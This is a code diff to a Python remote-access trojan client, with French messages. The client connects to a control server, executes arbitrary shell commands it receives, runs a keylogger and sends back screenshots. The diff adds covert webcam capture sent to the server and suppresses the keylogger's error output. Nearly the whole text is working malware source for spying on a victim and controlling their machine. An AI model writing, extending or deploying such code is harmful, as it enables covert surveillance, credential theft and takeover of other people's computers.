@@ -4,6 +4,7 @@ import threading
 from pynput import keyboard
 import pyautogui
 import io
+import cv2
 
 ip_address = '127.0.0.1'
 port_number = 1234
@@ -33,10 +34,40 @@ def start_keylogger():
                     else:
                         pass
         except Exception as e:
-            print(f"Erreur de keylogger : {e}")
+            pass
 
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
+
+def capture_screenshot():
+    screenshot = pyautogui.screenshot()
+    buffer = io.BytesIO()
+    screenshot.save(buffer, format="PNG")
+    buffer.seek(0)
+    return buffer.getvalue()
+
+def capture_webcam_image():
+    cap = cv2.VideoCapture(0)
+
+    if not cap.isOpened():
+        return None
+
+    ret, frame = cap.read()
+
+    if ret:
+        _, buffer = cv2.imencode('.png', frame)
+        image_bytes = buffer.tobytes()
+        cap.release()
+        return image_bytes
+    else:
+        cap.release()
+        return None
+
+def send_image_to_server(cs, image_bytes):
+    cs.send(str(len(image_bytes)).encode())
+    cs.recv(1024)
+
+    cs.sendall(image_bytes)
 
 def connect_to_server():
     cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -58,16 +89,19 @@ def connect_to_server():
                 except FileNotFoundError:
                     cs.send(b"Keylog file not found.")
             elif command.lower() == 'screenshot':
-                screenshot = pyautogui.screenshot()
-                buffer = io.BytesIO()
-                screenshot.save(buffer, format="PNG")
-                buffer.seek(0)
-
-                cs.send(str(len(buffer.getvalue())).encode())
-                cs.recv(1024)
-
-                cs.sendall(buffer.getvalue())
-                continue
+                image_bytes = capture_screenshot()
+                if image_bytes:
+                    send_image_to_server(cs, image_bytes)
+                    print("Capture d'écran envoyée.")
+                else:
+                    cs.send("Échec de la capture de l'écran.".encode('utf-8'))
+            elif command.lower() == 'webcam':
+                image_bytes = capture_webcam_image()
+                if image_bytes:
+                    send_image_to_server(cs, image_bytes)
+                    print("Photo de la webcam envoyée.")
+                else:
+                    cs.send("Échec de la capture de la webcam.".encode('utf-8'))
             elif command.startswith("scan"):
                 parts = command.split()
                 if len(parts) != 3:
@@ -80,18 +114,16 @@ def connect_to_server():
                 continue
             else:
                 result = subprocess.run(command, shell=True, capture_output=True, text=True)
-
                 output = result.stdout + result.stderr
                 if not output:
-                    output = "Commande executée, pas de sortie !."
-
+                    output = "Commande exécutée, pas de sortie !."
                 cs.send(output.encode())
 
         except ConnectionResetError:
             print("La connexion avec le serveur a été réinitialisée.")
             break
         except Exception as e:
-            cs.send(f"Error: {e}".encode())
+            cs.send(f"Error: {e}".encode('utf-8'))
             break
 
     cs.close()
